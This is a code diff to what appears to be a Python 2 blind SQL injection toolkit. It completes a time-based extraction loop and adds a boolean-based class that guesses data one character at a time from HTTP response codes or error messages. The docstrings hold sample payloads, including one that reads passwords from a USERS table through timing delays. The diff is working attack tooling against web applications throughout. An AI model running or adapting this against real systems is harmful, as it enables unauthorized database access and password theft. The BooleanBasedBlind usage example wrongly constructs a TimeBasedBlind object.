@@ -60,8 +60,8 @@ class TimeBasedBlind(BlindInjectionBase):
         1) Create an injection template. Use tags {CHARCODE} for letter and {POSITION} for it's position
             sqli = 'username=admin\' and iif({CHARCODE}=(select top 1 asc(mid(password,{POSITION},1)) from USERS), (SELECT count(*) FROM MSysAccessStorage As T1, MSysAccessStorage AS T2)>0, \'\')'
         2) Create urllib2.Request object and put {INJECTION} tag to the point of injection
-            url = http://example.com/?param1= + '{INJECTION}' # if the injection is in the URL
-            data = param1=value&param2={INJECTION} # if the injection is in the data
+            url = 'http://example.com/?param1={INJECTION}' # if the injection is in the URL
+            data = 'param1=value&param2={INJECTION}' # if the injection is in the data
             headers = {'HeaderName':'{INJECTION}'} # if the injection is somewhere in the headers
             req = urllib2.Request(url, data, headers)
         3) Create TimeBasedBlind object. Pass request, sql injection template, delay(optional) and char pool(optional) to it
@@ -85,6 +85,64 @@ class TimeBasedBlind(BlindInjectionBase):
             start = time.time()
             r = urllib2.urlopen(req)
             if time.time() - start >= self.delay:
+                return char
+
+        return None
+
+    def execute(self):
+        """
+        Begins data extraction
+        :return: Returns string, containing the results on success or None on failure
+        """
+        result, i = "", 1
+        char = self.guess_letter(i)
+
+        while char:
+            i += 1
+            result += char
+            char = self.guess_letter(i)
+
+        return result
+
+
+class BooleanBasedBlind(BlindInjectionBase):
+    """
+    Boolean-based Blind SQL Injection Class
+
+    Usage:
+        1) Create an injection template. Use tags {CHARCODE} for letter and {POSITION} for it's position
+            sqli = 'test\' or substring(database(),1,1)=\'a\'#'
+        2) Create urllib2.Request object and put {INJECTION} tag to the point of injection
+            url = 'http://example.com/?param1={INJECTION}' # if the injection is in the URL
+            data = 'param1=value&param2={INJECTION}' # if the injection is in the data
+            headers = {'HeaderName':'{INJECTION}'} # if the injection is somewhere in the headers
+            req = urllib2.Request(url, data, headers)
+        3) Create BooleanBasedBlind object. Pass request, sql injection template, response code, error message and char pool(optional) to it.
+           There is no need to provide both response code and error message, but at least one of them must be provided.
+            bi = TimeBasedBlind(req, sqli, 404, 'Not found')
+        4) Call execute() and wait for the results
+            res = bi.execute()
+
+    @:param request: urllib2.Request object, containing request data and {INJECTION} tag at the point of injection.
+    @:param sqli_template: SQL injection template.
+    @:param response_code: (optional) Server response code if the condition is false.
+    @:param error_message: (optional) Error message containing in response if the condition is false
+    @:param charpool: (optional) a pool of characters to guess from. Default value is equal to string.printable[:-6].
+    """
+    def __init__(self, request, sqli_template, response_code='', error_message='', charpool=CHARPOOL):
+        super(BooleanBasedBlind, self).__init__(request, sqli_template, charpool)
+
+        if not response_code and not error_message:
+            raise Exception('Neither response code nor error message were provided. Could not check if the result is true or false.')
+
+        self.response_code = response_code
+        self.error_message = error_message
+
+    def guess_letter(self, pos):
+        for char in self.charpool:
+            req = self._prepare_request(pos, char)
+            r = urllib2.urlopen(req)
+            if self.response_code == r.getcode() or self.error_message in r.read():
                 return char
 
         return None
